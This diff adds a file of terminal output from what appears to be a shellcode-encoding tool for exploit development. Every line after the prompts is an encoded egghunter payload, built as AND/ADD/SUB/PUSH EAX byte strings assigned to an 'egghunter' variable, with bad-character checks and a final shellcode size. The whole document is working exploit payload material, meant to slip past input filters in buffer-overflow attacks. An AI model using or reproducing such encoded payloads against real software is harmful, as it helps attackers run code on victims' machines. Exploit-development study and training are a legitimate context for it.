@@ -1,0 +1,68 @@
+Enter your shellcode: Enter shellcode variable name: [[92m+[0m] Shellcode size is divisible by 4
+[[94m*[0m] Encoding [e7ffe775]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+egghunter += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+egghunter += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+egghunter += "[37m\x05\x43\x64\x77\x64[0m" ## add  eax, 0x64776443
+egghunter += "[37m\x05\x33\x53\x66\x53[0m" ## add  eax, 0x53665333
+egghunter += "[37m\x05\x32\x63\x55\x63[0m" ## add  eax, 0x63556332
+egghunter += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+egghunter += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [afea75af]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+egghunter += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+egghunter += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+egghunter += "[37m\x05\x57\x43\x65\x57[0m" ## add  eax, 0x57654357
+egghunter += "[37m\x05\x46\x33\x54\x46[0m" ## add  eax, 0x46543346
+egghunter += "[37m\x05\x45\x32\x64\x45[0m" ## add  eax, 0x45643245
+egghunter += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+egghunter += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [d7895430]..
+[[92m+[0m] No bad character found, using default encoder..
+egghunter += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+egghunter += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+egghunter += "[37m\x05\x20\x32\x45\x73[0m" ## add  eax, 0x73453220
+egghunter += "[37m\x05\x10\x22\x44\x64[0m" ## add  eax, 0x64442210
+egghunter += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [3057b8ef]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+egghunter += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+egghunter += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+egghunter += "[37m\x05\x67\x64\x34\x21[0m" ## add  eax, 0x21346467
+egghunter += "[37m\x05\x56\x54\x33\x21[0m" ## add  eax, 0x21335456
+egghunter += "[37m\x05\x65\x33\x23\x21[0m" ## add  eax, 0x21233365
+egghunter += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+egghunter += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [745a053c]..
+[[92m+[0m] No bad character found, using default encoder..
+egghunter += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+egghunter += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+egghunter += "[37m\x05\x26\x03\x35\x32[0m" ## add  eax, 0x32350326
+egghunter += "[37m\x05\x16\x02\x25\x42[0m" ## add  eax, 0x42250216
+egghunter += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [2ecd5802]..
+[[92m+[0m] No bad character found, using default encoder..
+egghunter += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+egghunter += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+egghunter += "[37m\x05\x01\x34\x67\x17[0m" ## add  eax, 0x17673401
+egghunter += "[37m\x05\x01\x24\x66\x17[0m" ## add  eax, 0x17662401
+egghunter += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6a52420f]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+egghunter += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+egghunter += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+egghunter += "[37m\x05\x17\x32\x32\x35[0m" ## add  eax, 0x35323217
+egghunter += "[37m\x05\x16\x21\x31\x34[0m" ## add  eax, 0x34312116
+egghunter += "[37m\x05\x15\x22\x22\x34[0m" ## add  eax, 0x34222215
+egghunter += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+egghunter += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [ffca8166]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+egghunter += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+egghunter += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+egghunter += "[37m\x05\x33\x41\x65\x77[0m" ## add  eax, 0x77654133
+egghunter += "[37m\x05\x33\x42\x54\x66[0m" ## add  eax, 0x66544233
+egghunter += "[37m\x05\x33\x31\x44\x55[0m" ## add  eax, 0x55443133
+egghunter += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+egghunter += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Shellcode final size: 218 bytes
